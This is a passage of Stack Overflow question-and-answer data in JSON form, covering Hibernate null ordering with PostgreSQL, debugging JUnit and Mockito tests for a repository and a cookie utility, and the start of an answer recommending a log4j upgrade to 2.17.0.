sql.length();\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\tString orderByContent = sql.substring(orderByStart, orderByEnd);\r\n    \t\tString[] orderByNames = orderByContent.split(&quot;\\\\,&quot;);\r\n    \t\tfor (int i=0; i&lt;orderByNames.length; i++) {\r\n    \t\t\tif (orderByNames[i].trim().length() &gt; 0) {\r\n    \t\t\t\tif (orderByNames[i].trim().toLowerCase().endsWith(&quot;desc&quot;)) {\r\n    \t\t\t\t\torderByNames[i] += &quot; NULLS LAST&quot;;\r\n    \t\t\t\t} else {\r\n    \t\t\t\t\torderByNames[i] += &quot; NULLS FIRST&quot;;\r\n    \t\t\t\t}\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\torderByContent = StringUtils.join(orderByNames, &quot;,&quot;);\r\n    \t\tsql = sql.substring(0, orderByStart) + orderByContent + sql.substring(orderByEnd); \r\n    \t\treturn super.onPrepareStatement(sql);\r\n    \t}\r\n    \t\r\n    }\r\n    \r\n    \r\n    \r\n [1]: https://hibernate.atlassian.net/browse/HHH-465","title":"Hibernate order by with nulls last","body":"<p>Given that <a href=\"https://hibernate.atlassian.net/browse/HHH-465\" rel=\"noreferrer\">HHH-465</a> is not fixed and is not going to get fixed in a near future for the reasons given by Steve Ebersole, your best option would be to use the <code>CustomNullsFirstInterceptor</code> attached to the issue either globally or specifically to alter the SQL statement. </p>\n\n<p>I'm posting it below for the readers (credits to Emilio Dolce):</p>\n\n<pre><code>public class CustomNullsFirstInterceptor extends EmptyInterceptor {\n\n    private static final long serialVersionUID = -3156853534261313031L;\n\n    private static final String ORDER_BY_TOKEN = \"order by\";\n\n    public String onPrepareStatement(String sql) {\n\n        int orderByStart = sql.toLowerCase().indexOf(ORDER_BY_TOKEN);\n        if (orderByStart == -1) {\n            return super.onPrepareStatement(sql);\n        }\n        orderByStart += ORDER_BY_TOKEN.length() + 1;\n        int orderByEnd = sql.indexOf(\")\", orderByStart);\n        if (orderByEnd == -1) {\n            orderByEnd = sql.indexOf(\" UNION \", orderByStart);\n            if (orderByEnd == -1) {\n                orderByEnd = sql.length();\n            }\n        }\n        String orderByContent = sql.substring(orderByStart, orderByEnd);\n        String[] orderByNames = orderByContent.split(\"\\\\,\");\n        for (int i=0; i&lt;orderByNames.length; i++) {\n            if (orderByNames[i].trim().length() &gt; 0) {\n                if (orderByNames[i].trim().toLowerCase().endsWith(\"desc\")) {\n                    orderByNames[i] += \" NULLS LAST\";\n                } else {\n                    orderByNames[i] += \" NULLS FIRST\";\n                }\n            }\n        }\n        orderByContent = StringUtils.join(orderByNames, \",\");\n        sql = sql.substring(0, orderByStart) + orderByContent + sql.substring(orderByEnd); \n        return super.onPrepareStatement(sql);\n    }\n\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":21606,"reputation":4485,"user_id":52629,"display_name":"Matt"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1386720209,"creation_date":1374165476,"answer_id":17729276,"question_id":3683174,"body_markdown":"Here&#39;s my update to the class by (Pascal Thivent):\r\n\r\n    for (int i = 0; i &lt; orderByNames.length; i++) {\r\n        if (orderByNames[i].trim().length() &gt; 0) {\r\n            String orderName = orderByNames[i].trim().toLowerCase();\r\n            if (orderName.contains(&quot;desc&quot;)) {\r\n                orderByNames[i] = orderName.replace(&quot;desc&quot;, &quot;desc NULLS LAST&quot;);\r\n            } else {\r\n                orderByNames[i] = orderName.replace(&quot;asc&quot;, &quot;asc NULLS FIRST&quot;);\r\n            }\r\n        }\r\n    }\r\n\r\n\r\nThis fixes the problem: \r\n\r\n&gt; This breaks if sql has limit/offset after order by  Sathish Apr 1 &#39;11 at 14:52 \r\n\r\nAlso here&#39;s how you can use this within JPA (hibernate):\r\n\r\n\r\n    Session session = entityManager.unwrap(Session.class);\r\n    Session nullsSortingProperlySession = null;\r\n    try {\r\n        // perform a query guaranteeing that nulls will sort last\r\n        nullsSortingProperlySession = session.getSessionFactory().withOptions()\r\n            .interceptor(new GuaranteeNullsFirstInterceptor())\r\n            .openSession();\r\n    } finally {\r\n        // release the session, or the db connections will spiral\r\n        try {\r\n            if (nullsSortingProperlySession != null) {\r\n                nullsSortingProperlySession.close();\r\n            }\r\n        } catch (Exception e) {\r\n            logger.error(&quot;Error closing session&quot;, e);\r\n        }\r\n    }\r\n\r\nI&#39;ve tested this on postgres and it fixes the &#39;nulls are higher than non-nulls&#39; issue that we were having.","title":"Hibernate order by with nulls last","body":"<p>Here's my update to the class by (Pascal Thivent):</p>\n\n<pre><code>for (int i = 0; i &lt; orderByNames.length; i++) {\n    if (orderByNames[i].trim().length() &gt; 0) {\n        String orderName = orderByNames[i].trim().toLowerCase();\n        if (orderName.contains(\"desc\")) {\n            orderByNames[i] = orderName.replace(\"desc\", \"desc NULLS LAST\");\n        } else {\n            orderByNames[i] = orderName.replace(\"asc\", \"asc NULLS FIRST\");\n        }\n    }\n}\n</code></pre>\n\n<p>This fixes the problem: </p>\n\n<blockquote>\n  <p>This breaks if sql has limit/offset after order by  Sathish Apr 1 '11 at 14:52 </p>\n</blockquote>\n\n<p>Also here's how you can use this within JPA (hibernate):</p>\n\n<pre><code>Session session = entityManager.unwrap(Session.class);\nSession nullsSortingProperlySession = null;\ntry {\n    // perform a query guaranteeing that nulls will sort last\n    nullsSortingProperlySession = session.getSessionFactory().withOptions()\n        .interceptor(new GuaranteeNullsFirstInterceptor())\n        .openSession();\n} finally {\n    // release the session, or the db connections will spiral\n    try {\n        if (nullsSortingProperlySession != null) {\n            nullsSortingProperlySession.close();\n        }\n    } catch (Exception e) {\n        logger.error(\"Error closing session\", e);\n    }\n}\n</code></pre>\n\n<p>I've tested this on postgres and it fixes the 'nulls are higher than non-nulls' issue that we were having.</p>\n"},{"tags":[],"owner":{"account_id":1172329,"reputation":81,"user_id":1149229,"display_name":"Gennady Nikolaev"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1394179666,"creation_date":1394179666,"answer_id":22244751,"question_id":3683174,"body_markdown":"Another variant, if you create SQL on the fly and don&#39;t use Criteria API:\r\n\r\nORDER BY COALESCE(&lt;column_name&gt;,&#39;0&#39;) [ASC|DESC]\r\n\r\nThis works either for varchar or numeric columns. ","title":"Hibernate order by with nulls last","body":"<p>Another variant, if you create SQL on the fly and don't use Criteria API:</p>\n\n<p>ORDER BY COALESCE(,'0') [ASC|DESC]</p>\n\n<p>This works either for varchar or numeric columns. </p>\n"},{"tags":[],"owner":{"account_id":2590176,"reputation":1914,"user_id":2245051,"accept_rate":50,"display_name":"Jos&#233; Andias"},"down_vote_count":0,"up_vote_count":62,"is_accepted":false,"score":62,"last_activity_date":1411380100,"creation_date":1395863994,"answer_id":22671795,"question_id":3683174,"body_markdown":"This feature has been implemented during Hibernate 4.2.x and 4.3.x releases as previously mentioned.\r\n\r\nIt can be used as for example:\r\n\r\n    Criteria criteria = ...;\r\n    criteria.addOrder( Order.desc( &quot;name&quot; ).nulls(NullPrecedence.FIRST) );\r\n\r\nHibernate v4.3 javadocs are less omissive [here][1].\r\n\r\n\r\n  [1]: http://docs.jboss.org/hibernate/orm/4.3/javadocs/org/hibernate/criterion/Order.html#nulls%28org.hibernate.NullPrecedence%29","title":"Hibernate order by with nulls last","body":"<p>This feature has been implemented during Hibernate 4.2.x and 4.3.x releases as previously mentioned.</p>\n\n<p>It can be used as for example:</p>\n\n<pre><code>Criteria criteria = ...;\ncriteria.addOrder( Order.desc( \"name\" ).nulls(NullPrecedence.FIRST) );\n</code></pre>\n\n<p>Hibernate v4.3 javadocs are less omissive <a href=\"http://docs.jboss.org/hibernate/orm/4.3/javadocs/org/hibernate/criterion/Order.html#nulls%28org.hibernate.NullPrecedence%29\" rel=\"noreferrer\">here</a>.</p>\n"},{"tags":[],"owner":{"account_id":5056706,"reputation":4366,"user_id":4059755,"display_name":"uwolfer"},"down_vote_count":0,"up_vote_count":12,"is_accepted":false,"score":12,"last_activity_date":1500409800,"creation_date":1500409800,"answer_id":45176501,"question_id":3683174,"body_markdown":"You can configure &quot;nulls first&quot; / &quot;nulls last&quot; in hibernate properties so it will be picked up by any criteria call by default: `hibernate.order_by.default_null_ordering=last` (or `=first`).\r\n\r\nSee [this hibernate commit][1] for details.\r\n\r\n\r\n  [1]: https://github.com/hibernate/hibernate-orm/commit/add6aea6c64bf375a5b2bad7655c5914f1a48b48","title":"Hibernate order by with nulls last","body":"<p>You can configure \"nulls first\" / \"nulls last\" in hibernate properties so it will be picked up by any criteria call by default: <code>hibernate.order_by.default_null_ordering=last</code> (or <code>=first</code>).</p>\n\n<p>See <a href=\"https://github.com/hibernate/hibernate-orm/commit/add6aea6c64bf375a5b2bad7655c5914f1a48b48\" rel=\"noreferrer\">this hibernate commit</a> for details.</p>\n"},{"tags":[],"owner":{"account_id":1788251,"reputation":182,"user_id":1629196,"display_name":"Asraf Uddin Ahmed"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1592375502,"creation_date":1592375185,"answer_id":62422696,"question_id":3683174,"body_markdown":"We can create **Pageable** object with following **Sort** parameter: \r\n\r\n    JpaSort.unsafe(Sort.Direction.ASC, &quot;ISNULL(column_name), (column_name)&quot;)\r\n\r\nWe can prepare HQL as well:\r\n\r\n    String hql = &quot;FROM EntityName e ORDER BY e.columnName NULLS LAST&quot;;","title":"Hibernate order by with nulls last","body":"<p>We can create <strong>Pageable</strong> object with following <strong>Sort</strong> parameter: </p>\n\n<pre><code>JpaSort.unsafe(Sort.Direction.ASC, \"ISNULL(column_name), (column_name)\")\n</code></pre>\n\n<p>We can prepare HQL as well:</p>\n\n<pre><code>String hql = \"FROM EntityName e ORDER BY e.columnName NULLS LAST\";\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2969131,"reputation":340,"user_id":2521628,"display_name":"Jan Cizmar"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640267164,"creation_date":1640267164,"answer_id":70462998,"question_id":3683174,"body_markdown":"For future travellers... I solved this by overriding the Hibernate dialect. I needed to add null first for asc and null last for desc by default in CriteriaQuery, which is for some reason not supported. (It&#39;s supported in legacy CriteriaAPI)\r\n```\r\npackage io.tolgee.dialects.postgres\r\n\r\nimport org.hibernate.NullPrecedence\r\nimport org.hibernate.dialect.PostgreSQL10Dialect\r\n\r\n@Suppress(&quot;unused&quot;)\r\nclass CustomPostgreSQLDialect : PostgreSQL10Dialect() {\r\n\r\n  override fun renderOrderByElement(expression: String?, collation: String?, order: String?, nulls: NullPrecedence?): String {\r\n    if (nulls == NullPrecedence.NONE) {\r\n      if (order == &quot;asc&quot;) {\r\n        return super.renderOrderByElement(expression, collation, order, NullPrecedence.FIRST)\r\n      }\r\n      if (order == &quot;desc&quot;) {\r\n        return super.renderOrderByElement(expression, collation, order, NullPrecedence.LAST)\r\n      }\r\n    }\r\n    return super.renderOrderByElement(expression, collation, order, nulls)\r\n  }\r\n}\r\n","title":"Hibernate order by with nulls last","body":"<p>For future travellers... I solved this by overriding the Hibernate dialect. I needed to add null first for asc and null last for desc by default in CriteriaQuery, which is for some reason not supported. (It's supported in legacy CriteriaAPI)</p>\n<pre><code>package io.tolgee.dialects.postgres\n\nimport org.hibernate.NullPrecedence\nimport org.hibernate.dialect.PostgreSQL10Dialect\n\n@Suppress(&quot;unused&quot;)\nclass CustomPostgreSQLDialect : PostgreSQL10Dialect() {\n\n  override fun renderOrderByElement(expression: String?, collation: String?, order: String?, nulls: NullPrecedence?): String {\n    if (nulls == NullPrecedence.NONE) {\n      if (order == &quot;asc&quot;) {\n        return super.renderOrderByElement(expression, collation, order, NullPrecedence.FIRST)\n      }\n      if (order == &quot;desc&quot;) {\n        return super.renderOrderByElement(expression, collation, order, NullPrecedence.LAST)\n      }\n    }\n    return super.renderOrderByElement(expression, collation, order, nulls)\n  }\n}\n</code></pre>\n"}],"owner":{"account_id":23724,"reputation":13660,"user_id":59666,"accept_rate":76,"display_name":"mgamer"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":39799,"favorite_count":0,"down_vote_count":0,"up_vote_count":38,"accepted_answer_id":3683734,"answer_count":8,"score":38,"last_activity_date":1640267164,"creation_date":1284107424,"question_id":3683174,"body_markdown":"Hibernate used with PostgreSQL DB while ordering desc by a column puts null values higher than not null ones.\r\n\r\nSQL99 standard offers keyword &quot;NULLS LAST&quot; to declare that null values should be put lower than not nulls.\r\n\r\nCan &quot;NULLS LAST&quot; behaviour be achieved using Hibernate&#39;s Criteria API?","title":"Hibernate order by with nulls last","body":"<p>Hibernate used with PostgreSQL DB while ordering desc by a column puts null values higher than not null ones.</p>\n\n<p>SQL99 standard offers keyword \"NULLS LAST\" to declare that null values should be put lower than not nulls.</p>\n\n<p>Can \"NULLS LAST\" behaviour be achieved using Hibernate's Criteria API?</p>\n"},{"tags":["java","unit-testing","junit","spring-data-jpa","mockito"],"comments":[{"owner":{"account_id":3116234,"reputation":9296,"user_id":2636929,"display_name":"Stultuske"},"score":0,"creation_date":1640174289,"post_id":70448681,"comment_id":124531929,"body_markdown":"how did you mock agencyRepository?","body":"how did you mock agencyRepository?"},{"owner":{"account_id":2818342,"reputation":299856,"user_id":2422776,"display_name":"Mureinik"},"score":0,"creation_date":1640174389,"post_id":70448681,"comment_id":124531969,"body_markdown":"Can you share how `agencyRepository` is mocked, and how (if?) it&#39;s then injected to the `agencyService`?","body":"Can you share how <code>agencyRepository</code> is mocked, and how (if?) it&#39;s then injected to the <code>agencyService</code>?"},{"owner":{"account_id":3116234,"reputation":9296,"user_id":2636929,"display_name":"Stultuske"},"score":0,"creation_date":1640174741,"post_id":70448681,"comment_id":124532090,"body_markdown":"have you debugged your test?","body":"have you debugged your test?"},{"owner":{"account_id":20683043,"reputation":35,"user_id":15186159,"display_name":"Alessia"},"score":0,"creation_date":1640174838,"post_id":70448681,"comment_id":124532124,"body_markdown":"yes, it fails on the last line, on the assertEquals(). This is what I&#39;m getting: `at com.project.AgencyServiceTest.get(AgencyServiceTest.java:108)\n\tat java.base/java.util.ArrayList.forEach(ArrayList.java:1541)\n\tat java.base/java.util.ArrayList.forEach(ArrayList.java:1541)`","body":"yes, it fails on the last line, on the assertEquals(). This is what I&#39;m getting: <code>at com.project.AgencyServiceTest.get(AgencyServiceTest.java:108&zwnj;&#8203;) \tat java.base&#47;java.util.ArrayList.forEach(ArrayList.java:1541) \tat java.base&#47;java.util.ArrayList.forEach(ArrayList.java:1541)</code>"},{"owner":{"account_id":3116234,"reputation":9296,"user_id":2636929,"display_name":"Stultuske"},"score":0,"creation_date":1640174878,"post_id":70448681,"comment_id":124532143,"body_markdown":"have you checked whether repo.findAll() actually returns the result you expect?","body":"have you checked whether repo.findAll() actually returns the result you expect?"},{"owner":{"account_id":20683043,"reputation":35,"user_id":15186159,"display_name":"Alessia"},"score":0,"creation_date":1640174986,"post_id":70448681,"comment_id":124532182,"body_markdown":"yes, I&#39;ve tested it in Postman, the method works just fine","body":"yes, I&#39;ve tested it in Postman, the method works just fine"},{"owner":{"account_id":1560426,"reputation":8053,"user_id":1450401,"accept_rate":61,"display_name":"edwin"},"score":0,"creation_date":1640175104,"post_id":70448681,"comment_id":124532228,"body_markdown":"&#39;existingAgencies&#39; used to mock method call is an empty List, that&#39;s the reason you assert fails, you had initialize that but it doesn&#39;t have any items","body":"&#39;existingAgencies&#39; used to mock method call is an empty List, that&#39;s the reason you assert fails, you had initialize that but it doesn&#39;t have any items"},{"owner":{"account_id":3116234,"reputation":9296,"user_id":2636929,"display_name":"Stultuske"},"score":0,"creation_date":1640175988,"post_id":70448681,"comment_id":124532552,"body_markdown":"@Alessia I meant during your test, which is why I asked you if you had debugged","body":"@Alessia I meant during your test, which is why I asked you if you had debugged"},{"owner":{"account_id":20683043,"reputation":35,"user_id":15186159,"display_name":"Alessia"},"score":0,"creation_date":1640182270,"post_id":70448681,"comment_id":124535047,"body_markdown":"Yes, I have, and the result of repo.findAll() is ok","body":"Yes, I have, and the result of repo.findAll() is ok"}],"answers":[{"tags":[],"owner":{"account_id":1560426,"reputation":8053,"user_id":1450401,"accept_rate":61,"display_name":"edwin"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1640262027,"creation_date":1640175376,"answer_id":70448905,"question_id":70448681,"body_markdown":"if i understand your code coreectly\r\n`agencyRepository.findAll()` return `List&lt;Agency&gt;`\r\n`agencyService.getAll()` return  `List&lt;AgencyDto&gt;`\r\n\r\n\r\n\r\nIssue is here\r\n      \r\n      List&lt;Agency&gt; existingAgencies = new ArrayList&lt;Agency&gt;();\r\n      when(agencyRepository.findAll()).thenReturn(existingAgencies);\r\n\r\nyour mock returns an empty list, you need to add items to list\r\n\r\neg:\r\n    \r\n    List&lt;Agency&gt; existingAgencies = new ArrayList&lt;Agency&gt;();\r\n    existingAgencies.add(agencyObjectInDB1);\r\n    existingAgencies.add(agencyObjectInDB2);\r\n    existingAgencies.add(agencyObjectInDB3);\r\n    //Mock repo call\r\n    when(agencyRepository.findAll()).thenReturn(existingAgencies);  \r\n    \r\n    //I assume Here inside getAll() , agencyRepository.findAll() is invoked\r\n    //getAll() converts Agency to AgencyDto\r\n    List&lt;AgencyDto&gt; result = agencyService.getAll();\r\n\r\n    // assert against pre-pepared list \r\n    assertEquals(agencies, result);\r\n\r\n\r\n\r\n","title":"JUnit test to retrieve all entities fails with actual result &#39;[]&#39;","body":"<p>if i understand your code coreectly\n<code>agencyRepository.findAll()</code> return <code>List&lt;Agency&gt;</code>\n<code>agencyService.getAll()</code> return  <code>List&lt;AgencyDto&gt;</code></p>\n<p>Issue is here</p>\n<pre><code>  List&lt;Agency&gt; existingAgencies = new ArrayList&lt;Agency&gt;();\n  when(agencyRepository.findAll()).thenReturn(existingAgencies);\n</code></pre>\n<p>your mock returns an empty list, you need to add items to list</p>\n<p>eg:</p>\n<pre><code>List&lt;Agency&gt; existingAgencies = new ArrayList&lt;Agency&gt;();\nexistingAgencies.add(agencyObjectInDB1);\nexistingAgencies.add(agencyObjectInDB2);\nexistingAgencies.add(agencyObjectInDB3);\n//Mock repo call\nwhen(agencyRepository.findAll()).thenReturn(existingAgencies);  \n\n//I assume Here inside getAll() , agencyRepository.findAll() is invoked\n//getAll() converts Agency to AgencyDto\nList&lt;AgencyDto&gt; result = agencyService.getAll();\n\n// assert against pre-pepared list \nassertEquals(agencies, result);\n</code></pre>\n"}],"owner":{"account_id":20683043,"reputation":35,"user_id":15186159,"display_name":"Alessia"},"comment_count":9,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":790,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1640267126,"creation_date":1640174163,"question_id":70448681,"body_markdown":"I am trying to test my method for getting back all entities that exist in my db. I am using JUnit and Mockito. I have no experience with testing so far and this is how far I&#39;ve got:\r\nThis is my method from the agency service to get back all entities, using the findAll() function of JpaRepository:\r\n```\r\n      public List&lt;AgencyDto&gt; getAll() {\r\n        return repo.findAll().stream().map(agency -&gt; mapper.mapToDto(agency)).collect(Collectors.toList());\r\n    }\r\n\r\n```\r\n```\r\n@ExtendWith(MockitoExtension.class)\r\npublic class AgencyServiceTest {\r\n\r\n    @Mock\r\n    private AgencyRepository agencyRepository;\r\n\r\n\r\n    @InjectMocks\r\n    private AgencyService agencyService;\r\n\r\n    @Test\r\n    void getAgencies() {\r\n      \r\n        List&lt;Agency&gt; existingAgencies = new ArrayList&lt;Agency&gt;();\r\n        Agency agency1 = new Agency();\r\n        Agency agency2 = new Agency();\r\n\r\n        existingAgencies.add(agency1);\r\n        existingAgencies.add(agency2);\r\n\r\n        when(agencyRepository.findAll()).thenReturn(existingAgencies);\r\n\r\n        List&lt;AgencyDto&gt; result = agencyService.getAll();\r\n\r\n        assertEquals(existingAgencies, result);\r\n    }\r\n}\r\n```\r\nWhen running the test, the value for expected seems ok, but the value for actual is an empty array:\r\n```\r\nExpected :[com.project.DTOs.AgencyDto@245a26e1, com.project.DTOs.AgencyDto@4d63b624, com.project.DTOs.AgencyDto@466cf502]\r\nActual   :[]\r\n```\r\nIs this not the right way to test get() methods? Am I doing something wrong when setting the actual result?","title":"JUnit test to retrieve all entities fails with actual result &#39;[]&#39;","body":"<p>I am trying to test my method for getting back all entities that exist in my db. I am using JUnit and Mockito. I have no experience with testing so far and this is how far I've got:\nThis is my method from the agency service to get back all entities, using the findAll() function of JpaRepository:</p>\n<pre><code>      public List&lt;AgencyDto&gt; getAll() {\n        return repo.findAll().stream().map(agency -&gt; mapper.mapToDto(agency)).collect(Collectors.toList());\n    }\n\n</code></pre>\n<pre><code>@ExtendWith(MockitoExtension.class)\npublic class AgencyServiceTest {\n\n    @Mock\n    private AgencyRepository agencyRepository;\n\n\n    @InjectMocks\n    private AgencyService agencyService;\n\n    @Test\n    void getAgencies() {\n      \n        List&lt;Agency&gt; existingAgencies = new ArrayList&lt;Agency&gt;();\n        Agency agency1 = new Agency();\n        Agency agency2 = new Agency();\n\n        existingAgencies.add(agency1);\n        existingAgencies.add(agency2);\n\n        when(agencyRepository.findAll()).thenReturn(existingAgencies);\n\n        List&lt;AgencyDto&gt; result = agencyService.getAll();\n\n        assertEquals(existingAgencies, result);\n    }\n}\n</code></pre>\n<p>When running the test, the value for expected seems ok, but the value for actual is an empty array:</p>\n<pre><code>Expected :[com.project.DTOs.AgencyDto@245a26e1, com.project.DTOs.AgencyDto@4d63b624, com.project.DTOs.AgencyDto@466cf502]\nActual   :[]\n</code></pre>\n<p>Is this not the right way to test get() methods? Am I doing something wrong when setting the actual result?</p>\n"},{"tags":["java","spring-boot","unit-testing","mockito"],"comments":[{"owner":{"account_id":1063012,"reputation":71986,"user_id":1064245,"accept_rate":82,"display_name":"M A"},"score":0,"creation_date":1640263631,"post_id":70462251,"comment_id":124556129,"body_markdown":"What is `httpServletRequest` in the last assert? Shouldn&#39;t it be `request`?","body":"What is <code>httpServletRequest</code> in the last assert? Shouldn&#39;t it be <code>request</code>?"},{"owner":{"account_id":1713236,"reputation":22836,"user_id":1570854,"accept_rate":71,"display_name":"Lesiak"},"score":0,"creation_date":1640264341,"post_id":70462251,"comment_id":124556343,"body_markdown":"You stub methods on system under test with `when(cookieSessionUtils.getCookieByName(request, &quot;viaductLocalAmp&quot;)).thenReturn(&quot;Y&quot;);`. I find it strange that it does not throw - is it a SpyBean?","body":"You stub methods on system under test with <code>when(cookieSessionUtils.getCookieByName(request, &quot;viaductLocalAmp&quot;)).thenReturn(&quot;Y&quot;);</code>. I find it strange that it does not throw - is it a SpyBean?"},{"owner":{"account_id":8915876,"reputation":3560,"user_id":6654475,"accept_rate":100,"display_name":"Francislainy Campos"},"score":0,"creation_date":1640266880,"post_id":70462251,"comment_id":124557201,"body_markdown":"Yes, thank you. You&#39;re both right. I had two objects for the HttpRequest and the one called request was actually annotated with atMockBean instead of atMock. Using only the @Mock one fixed the issue.","body":"Yes, thank you. You&#39;re both right. I had two objects for the HttpRequest and the one called request was actually annotated with atMockBean instead of atMock. Using only the @Mock one fixed the issue."}],"answers":[{"tags":[],"owner":{"account_id":8915876,"reputation":3560,"user_id":6654475,"accept_rate":100,"display_name":"Francislainy Campos"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1640267004,"creation_date":1640267004,"answer_id":70462959,"question_id":70462251,"body_markdown":"I was using the wrong object under the assertion. The @httpRequest is annotated with @MockBean, whereas request uses @Mock, which is what I should be using for this scenario.","title":"Mock return value for cookie.getValue() using Mockito","body":"<p>I was using the wrong object under the assertion. The @httpRequest is annotated with @MockBean, whereas request uses @Mock, which is what I should be using for this scenario.</p>\n"}],"owner":{"account_id":8915876,"reputation":3560,"user_id":6654475,"accept_rate":100,"display_name":"Francislainy Campos"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":477,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70462959,"answer_count":1,"score":0,"last_activity_date":1640267004,"creation_date":1640263120,"question_id":70462251,"body_markdown":"I&#39;m trying to test the getCookieByName method which is used by another method. However, not sure I&#39;m doing this correctly as it seems the method is being called multiple times and it sets the value the first attempt but then is empty on the last call. I think maybe the order for the mock calls may be wrong or some of them may not be needed, but if I remove any of what I still get other errors, so not sure what I&#39;m actually doing wrong.\r\n\r\n    @Service\r\n    public class CookieSessionUtils {\r\n\r\n    private static final String VIADUCT_LOCAL_AMP = &quot;viaductLocalAmp&quot;; // Value to be changed when the test runs to test the &quot;if Y&quot; scenario.\r\n\r\n\r\n    public boolean verifyState(HttpServletRequest request, String state) {\r\n\r\n        String viaductLocalAmp = getCookieByName(request, VIADUCT_LOCAL_AMP); \r\n\r\n        if (viaductLocalAmp.equalsIgnoreCase(&quot;Y&quot;)) {\r\n            return true;\r\n        }\r\n\r\n        return false;\r\n    }\r\n\r\n    public String getCookieByName(HttpServletRequest request, String cookieName) {\r\n        try {\r\n            Cookie[] cookies = request.getCookies();\r\n            if (cookies != null) {\r\n                for (Cookie cookie : cookies) {\r\n                    if (cookie.getName().equals(cookieName)) {\r\n                        return cookie.getValue();\r\n                    }\r\n                }\r\n            }\r\n        } catch (Exception e) {\r\n            ExceptionLogger.logDetailedError(&quot;CookieSessionUtils.getCookieByName&quot;, e);\r\n            log.error(&quot;Error on Cookie &quot; + e.getMessage());\r\n        }\r\n        return &quot;&quot;;\r\n    }\r\n\r\n\r\nThese are my test and mock calls as well as the two times getCookieByName() is being called within the same method.\r\n\r\n    @Autowired\r\n    private CookieSessionUtils cookieSessionUtils;\r\n\r\n    @Mock\r\n    private HttpServletRequest request;\r\n\r\n       @Test\r\n    public void testVerifyStateWhenCookieNameStartsWithY() {\r\n\r\n        Cookie mockCookie = Mockito.mock(Cookie.class);\r\n        when(mockCookie.getName()).thenReturn(&quot;viaductLocalAmp&quot;);\r\n        when(mockCookie.getValue()).thenReturn(&quot;viaductLocalAmp&quot;);\r\n\r\n        when(request.getCookies()).thenReturn(new Cookie[]{mockCookie});\r\n\r\n        when(cookieSessionUtils.getCookieByName(request, &quot;viaductLocalAmp&quot;)).thenReturn(&quot;Y&quot;);\r\n\r\n        assertTrue(cookieSessionUtils.verifyState(httpServletRequest, &quot;viaductLocalAmp&quot;));\r\n    }\r\n\r\n\r\n[![enter image description here][1]][1]\r\n\r\n[![enter image description here][2]][2]\r\n\r\nThank you.\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/2neyE.png\r\n  [2]: https://i.stack.imgur.com/hzPpS.png","title":"Mock return value for cookie.getValue() using Mockito","body":"<p>I'm trying to test the getCookieByName method which is used by another method. However, not sure I'm doing this correctly as it seems the method is being called multiple times and it sets the value the first attempt but then is empty on the last call. I think maybe the order for the mock calls may be wrong or some of them may not be needed, but if I remove any of what I still get other errors, so not sure what I'm actually doing wrong.</p>\n<pre><code>@Service\npublic class CookieSessionUtils {\n\nprivate static final String VIADUCT_LOCAL_AMP = &quot;viaductLocalAmp&quot;; // Value to be changed when the test runs to test the &quot;if Y&quot; scenario.\n\n\npublic boolean verifyState(HttpServletRequest request, String state) {\n\n    String viaductLocalAmp = getCookieByName(request, VIADUCT_LOCAL_AMP); \n\n    if (viaductLocalAmp.equalsIgnoreCase(&quot;Y&quot;)) {\n        return true;\n    }\n\n    return false;\n}\n\npublic String getCookieByName(HttpServletRequest request, String cookieName) {\n    try {\n        Cookie[] cookies = request.getCookies();\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (cookie.getName().equals(cookieName)) {\n                    return cookie.getValue();\n                }\n            }\n        }\n    } catch (Exception e) {\n        ExceptionLogger.logDetailedError(&quot;CookieSessionUtils.getCookieByName&quot;, e);\n        log.error(&quot;Error on Cookie &quot; + e.getMessage());\n    }\n    return &quot;&quot;;\n}\n</code></pre>\n<p>These are my test and mock calls as well as the two times getCookieByName() is being called within the same method.</p>\n<pre><code>@Autowired\nprivate CookieSessionUtils cookieSessionUtils;\n\n@Mock\nprivate HttpServletRequest request;\n\n   @Test\npublic void testVerifyStateWhenCookieNameStartsWithY() {\n\n    Cookie mockCookie = Mockito.mock(Cookie.class);\n    when(mockCookie.getName()).thenReturn(&quot;viaductLocalAmp&quot;);\n    when(mockCookie.getValue()).thenReturn(&quot;viaductLocalAmp&quot;);\n\n    when(request.getCookies()).thenReturn(new Cookie[]{mockCookie});\n\n    when(cookieSessionUtils.getCookieByName(request, &quot;viaductLocalAmp&quot;)).thenReturn(&quot;Y&quot;);\n\n    assertTrue(cookieSessionUtils.verifyState(httpServletRequest, &quot;viaductLocalAmp&quot;));\n}\n</code></pre>\n<p><a href=\"https://i.stack.imgur.com/2neyE.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/2neyE.png\" alt=\"enter image description here\" /></a></p>\n<p><a href=\"https://i.stack.imgur.com/hzPpS.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/hzPpS.png\" alt=\"enter image description here\" /></a></p>\n<p>Thank you.</p>\n"},{"tags":["java","log4j","log4j2"],"answers":[{"tags":[],"owner":{"account_id":5281408,"reputation":18797,"user_id":4216641,"display_name":"Turing85"},"down_vote_count":0,"up_vote_count":5,"is_accepted":true,"score":5,"last_activity_date":1640266958,"creation_date":1639247583,"answer_id":70317974,"question_id":70317913,"body_markdown":"We should upgrade log4j to version `2.17.0` (available at [`mvnrepository.com`][mavenLog4J]). [As per the security notes (`logging.apache.org`)][log4J2.15patchnotes], the vulnerability is fixed in `2.15.0`. There are, however, two other vulnerabilities in `2.15.0`, which were patched in `2.16.0` and `2.17.0` respectively. \r\n\r\nThe security notes also list actions to 